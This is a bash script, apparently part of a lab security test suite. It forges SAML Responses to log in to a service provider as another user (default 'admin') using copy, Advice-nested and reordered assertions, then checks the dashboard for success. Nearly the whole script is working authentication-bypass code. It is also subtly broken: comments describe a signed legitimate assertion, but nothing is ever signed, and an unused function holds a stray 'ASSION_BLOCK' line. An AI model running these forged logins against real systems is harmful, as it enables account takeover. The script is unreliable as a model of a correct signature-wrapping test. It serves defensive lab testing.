#!/usr/bin/env bash
# A12 — SAML Signature Wrapping
# OWASP ASVS v4.2 § 9.2.1 / MITRE ATT&CK T1190
#
# Profile: e1b (Keycloak + SAML + Password)
#
# SAML Signature Wrapping attacks exploit differences in how the SP parses
# and validates the XML response. Common patterns:
#
#   1. "Copy" attack: duplicate the <Assertion> element — one signed (legitimate),
#      one unsigned (attacker-controlled). If the SP validates the signature on
#      the original but reads attributes from the attacker's copy, it's vulnerable.
#
#   2. "Wrap" attack: nest a new unsigned assertion inside the existing signed
#      assertion (e.g., inside an <Advice> element). The signature covers only
#      the outer element, but the SP may read from the inner one.
#
# This script tests both patterns against the ACS endpoint.
#
# Usage:
#   bash A12_saml_signature_wrapping.sh <app_url> [target_user]

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/common.sh"

APP_URL="${1:?Usage: $0 <app_url> [target_user]}"
TARGET_USER="${2:-admin}"

echo "[A12] SAML Signature Wrapping — assertion injection via XML structure"
echo "     App: $APP_URL  |  Target user: $TARGET_USER"
echo

# ── Helper: build a minimal valid-looking SAML Response ──────────────────────

build_saml_response() {
  local assertion_id="$1"
  local name_id="$2"
  local issuer="$3"
  local audience="$4"
  local acs_url="$5"
  local now="$6"
  local not_after="$7"

  cat <<SAML_EOF
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  ID="_response_${assertion_id}" Version="2.0"
  IssueInstant="${now}" Destination="${acs_url}"
  InResponseTo="_fake_request">
  <saml:Issuer>${issuer}</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
ASSION_BLOCK
</samlp:Response>
SAML_EOF
}

build_assertion() {
  local assertion_id="$1"
  local name_id="$2"
  local issuer="$3"
  local audience="$4"
  local acs_url="$5"
  local now="$6"
  local not_after="$7"

  cat <<ASSERTION_EOF
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="${assertion_id}" Version="2.0" IssueInstant="${now}">
    <saml:Issuer>${issuer}</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:username">${name_id}</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="${not_after}"
          Recipient="${acs_url}" InResponseTo="_fake_request"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="${now}" NotOnOrAfter="${not_after}">
      <saml:AudienceRestriction>
        <saml:Audience>${audience}</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AttributeStatement>
      <saml:Attribute Name="username">
        <saml:AttributeValue>${name_id}</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
ASSERTION_EOF
}

NOW=$(date -u +%Y-%m-%dT%H:%M:%SZ)
NOT_AFTER=$(date -u -v+5M +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date -u -d '+5 minutes' +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo "${NOW}")
ISSUER="http://idp.sso-lab.local:8080/realms/sso-lab"
AUDIENCE="sso-test-app-saml"
ACS_URL="${APP_URL%/}/saml/acs"

RESULTS=()

# ── Test 1: "Copy" Attack — Two assertions in same response ──────────────────
# The first assertion has a legitimate user, the second claims to be admin.
# Vulnerable SPs take the second (unsigned) assertion.
echo "  [Test 1] Copy Attack — two assertions in one Response"
echo "           First assertion: testuser | Second assertion: ${TARGET_USER}"

LEGIT_ASSERTION=$(build_assertion "id_legit_$$" "testuser" "$ISSUER" "$AUDIENCE" "$ACS_URL" "$NOW" "$NOT_AFTER")
EVIL_ASSERTION=$(build_assertion "id_evil_$$" "$TARGET_USER" "$ISSUER" "$AUDIENCE" "$ACS_URL" "$NOW" "$NOT_AFTER")

RESPONSE_COPY="<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"
  xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"
  ID=\"_response_copy_$$\" Version=\"2.0\" IssueInstant=\"${NOW}\"
  Destination=\"${ACS_URL}\" InResponseTo=\"_fake_request\">
  <saml:Issuer>${ISSUER}</saml:Issuer>
  <samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status>
${LEGIT_ASSERTION}
${EVIL_ASSERTION}
</samlp:Response>"

ENCODED_COPY=$(printf '%s' "$RESPONSE_COPY" | base64)

RESP_FILE="/tmp/a12_t1_$$.html"
JAR="/tmp/a12_t1_jar_$$.txt"

STATUS_T1=$(rcurl -sk -o "$RESP_FILE" -c "$JAR" -w "%{http_code}" \
  -X POST \
  --data-urlencode "SAMLResponse=${ENCODED_COPY}" \
  "${ACS_URL}" 2>/dev/null || echo "000")

BODY_T1=$(head -c 500 "$RESP_FILE" 2>/dev/null || true)
rm -f "$RESP_FILE"

# Check if we got authenticated as TARGET_USER
AUTHENTICATED_AS=""
if [[ -f "$JAR" ]]; then
  # Try accessing dashboard with session cookie
  DASH_RESP="/tmp/a12_t1_dash_$$.html"
  rcurl -sk -b "$JAR" -L --max-redirs 3 -o "$DASH_RESP" -w "%{http_code}" \
    "${APP_URL%/}/dashboard" > /dev/null 2>&1 || true
  DASH_BODY=$(head -c 1000 "$DASH_RESP" 2>/dev/null || true)
  
  if echo "$DASH_BODY" | grep -qi "$TARGET_USER"; then
    AUTHENTICATED_AS="$TARGET_USER"
    echo "           → Dashboard shows user: $TARGET_USER"
  elif echo "$DASH_BODY" | grep -qi "testuser"; then
    AUTHENTICATED_AS="testuser"
    echo "           → Dashboard shows user: testuser (legitimate)"
  elif echo "$DASH_BODY" | grep -q "200\|OK"; then
    AUTHENTICATED_AS="some_user"
  fi
  rm -f "$DASH_RESP"
fi

echo "           → HTTP $STATUS_T1 (authenticated as: ${AUTHENTICATED_AS:-none})"

if [[ "$STATUS_T1" == "302" && "$AUTHENTICATED_AS" == "$TARGET_USER" ]]; then
  echo "           VULNERABLE — Copy attack succeeded, authenticated as $TARGET_USER"
  RESULTS+=("T1-Copy:VULNERABLE")
elif [[ "$STATUS_T1" == "302" && "$AUTHENTICATED_AS" == "testuser" ]]; then
  echo "           PROTECTED  — Server used legitimate assertion, not the injected copy"
  RESULTS+=("T1-Copy:PROTECTED")
elif [[ "$STATUS_T1" == "403" ]]; then
  echo "           PROTECTED  — Assertion rejected (HTTP 403)"
  RESULTS+=("T1-Copy:PROTECTED")
else
  echo "           UNCLEAR   — HTTP $STATUS_T1, could not determine which assertion was used"
  RESULTS+=("T1-Copy:UNCLEAR")
fi
rm -f "$JAR"
echo

# ── Test 2: "Wrap" Attack — nested assertion inside Advice element ────────────
# Inject a crafted assertion inside <Advice> of a legitimate-looking assertion.
# Some parsers enumerate all Assertions in the document including nested ones.
echo "  [Test 2] Wrap Attack — assertion nested inside <Advice>"
echo "           Outer assertion: testuser | Nested assertion: ${TARGET_USER}"

NESTED_ASSERTION=$(build_assertion "id_nested_$$" "$TARGET_USER" "$ISSUER" "$AUDIENCE" "$ACS_URL" "$NOW" "$NOT_AFTER")

RESPONSE_WRAP="<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"
  xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"
  ID=\"_response_wrap_$$\" Version=\"2.0\" IssueInstant=\"${NOW}\"
  Destination=\"${ACS_URL}\" InResponseTo=\"_fake_request\">
  <saml:Issuer>${ISSUER}</saml:Issuer>
  <samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status>
  <saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"
    ID=\"id_outer_$$\" Version=\"2.0\" IssueInstant=\"${NOW}\">
    <saml:Issuer>${ISSUER}</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:username\">testuser</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore=\"${NOW}\" NotOnOrAfter=\"${NOT_AFTER}\">
      <saml:AudienceRestriction>
        <saml:Audience>${AUDIENCE}</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:Advice>
${NESTED_ASSERTION}
    </saml:Advice>
  </saml:Assertion>
</samlp:Response>"

ENCODED_WRAP=$(printf '%s' "$RESPONSE_WRAP" | base64)

RESP_FILE="/tmp/a12_t2_$$.html"
JAR="/tmp/a12_t2_jar_$$.txt"

STATUS_T2=$(rcurl -sk -o "$RESP_FILE" -c "$JAR" -w "%{http_code}" \
  -X POST \
  --data-urlencode "SAMLResponse=${ENCODED_WRAP}" \
  "${ACS_URL}" 2>/dev/null || echo "000")

BODY_T2=$(head -c 300 "$RESP_FILE" 2>/dev/null || true)
rm -f "$RESP_FILE"

AUTHENTICATED_AS2=""
if [[ -f "$JAR" ]]; then
  DASH_RESP="/tmp/a12_t2_dash_$$.html"
  rcurl -sk -b "$JAR" -L --max-redirs 3 -o "$DASH_RESP" \
    "${APP_URL%/}/dashboard" > /dev/null 2>&1 || true
  DASH_BODY2=$(head -c 1000 "$DASH_RESP" 2>/dev/null || true)
  
  if echo "$DASH_BODY2" | grep -qi "$TARGET_USER"; then
    AUTHENTICATED_AS2="$TARGET_USER"
  elif echo "$DASH_BODY2" | grep -qi "testuser"; then
    AUTHENTICATED_AS2="testuser"
  fi
  rm -f "$DASH_RESP"
fi

echo "           → HTTP $STATUS_T2 (authenticated as: ${AUTHENTICATED_AS2:-none})"

if [[ "$STATUS_T2" == "302" && "$AUTHENTICATED_AS2" == "$TARGET_USER" ]]; then
  echo "           VULNERABLE — Wrap attack succeeded, read from Advice-nested assertion"
  RESULTS+=("T2-Wrap:VULNERABLE")
elif [[ "$STATUS_T2" == "403" ]]; then
  echo "           PROTECTED  — Wrapped assertion rejected (HTTP 403)"
  RESULTS+=("T2-Wrap:PROTECTED")
elif [[ -n "$AUTHENTICATED_AS2" ]]; then
  echo "           PARTIAL  — Authenticated as $AUTHENTICATED_AS2 (not target user)"
  RESULTS+=("T2-Wrap:PARTIAL")
else
  echo "           UNCLEAR   — HTTP $STATUS_T2"
  RESULTS+=("T2-Wrap:UNCLEAR")
fi
rm -f "$JAR"
echo

# ── Test 3: Reordered assertions — attacker's assertion FIRST ────────────────
# Some implementations take the first Assertion child. Put the evil one first.
echo "  [Test 3] Order Attack — evil assertion placed BEFORE legitimate one"
echo "           First assertion: ${TARGET_USER} (injected) | Second: testuser (legit)"

RESPONSE_REORDER="<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"
  xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"
  ID=\"_response_reorder_$$\" Version=\"2.0\" IssueInstant=\"${NOW}\"
  Destination=\"${ACS_URL}\" InResponseTo=\"_fake_request\">
  <saml:Issuer>${ISSUER}</saml:Issuer>
  <samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status>
$(build_assertion "id_first_evil_$$" "$TARGET_USER" "$ISSUER" "$AUDIENCE" "$ACS_URL" "$NOW" "$NOT_AFTER")
$(build_assertion "id_second_legit_$$" "testuser" "$ISSUER" "$AUDIENCE" "$ACS_URL" "$NOW" "$NOT_AFTER")
</samlp:Response>"

ENCODED_REORDER=$(printf '%s' "$RESPONSE_REORDER" | base64)

RESP_FILE="/tmp/a12_t3_$$.html"
JAR="/tmp/a12_t3_jar_$$.txt"

STATUS_T3=$(rcurl -sk -o "$RESP_FILE" -c "$JAR" -w "%{http_code}" \
  -X POST \
  --data-urlencode "SAMLResponse=${ENCODED_REORDER}" \
  "${ACS_URL}" 2>/dev/null || echo "000")

rm -f "$RESP_FILE"

AUTHENTICATED_AS3=""
if [[ -f "$JAR" ]]; then
  DASH_RESP="/tmp/a12_t3_dash_$$.html"
  rcurl -sk -b "$JAR" -L --max-redirs 3 -o "$DASH_RESP" \
    "${APP_URL%/}/dashboard" > /dev/null 2>&1 || true
  DASH_BODY3=$(head -c 1000 "$DASH_RESP" 2>/dev/null || true)
  
  if echo "$DASH_BODY3" | grep -qi "$TARGET_USER"; then
    AUTHENTICATED_AS3="$TARGET_USER"
  elif echo "$DASH_BODY3" | grep -qi "testuser"; then
    AUTHENTICATED_AS3="testuser"
  fi
  rm -f "$DASH_RESP"
fi

echo "           → HTTP $STATUS_T3 (authenticated as: ${AUTHENTICATED_AS3:-none})"

if [[ "$STATUS_T3" == "302" && "$AUTHENTICATED_AS3" == "$TARGET_USER" ]]; then
  echo "           VULNERABLE — Order attack succeeded, first (evil) assertion was processed"
  RESULTS+=("T3-Order:VULNERABLE")
elif [[ "$STATUS_T3" == "403" ]]; then
  echo "           PROTECTED  — Reordered assertions rejected (HTTP 403)"
  RESULTS+=("T3-Order:PROTECTED")
elif [[ -n "$AUTHENTICATED_AS3" ]]; then
  echo "           PARTIAL  — Authenticated as $AUTHENTICATED_AS3 (not target user)"
  RESULTS+=("T3-Order:PARTIAL")
else
  echo "           UNCLEAR   — HTTP $STATUS_T3"
  RESULTS+=("T3-Order:UNCLEAR")
fi
rm -f "$JAR"
echo

# ── Summary ─────────────────────────────────────────────────────────────────
echo "─── Summary ───────────────────────────────────"
for r in "${RESULTS[@]}"; do echo "  $r"; done
echo

ANY_VULN=false
for r in "${RESULTS[@]}"; do [[ "$r" == *VULNERABLE* ]] && ANY_VULN=true; done

if $ANY_VULN; then
  echo "VULNERABLE — at least one Signature Wrapping variant bypassed the SP"
else
  echo "PROTECTED  — all Signature Wrapping attempts were rejected or not processed"
fi
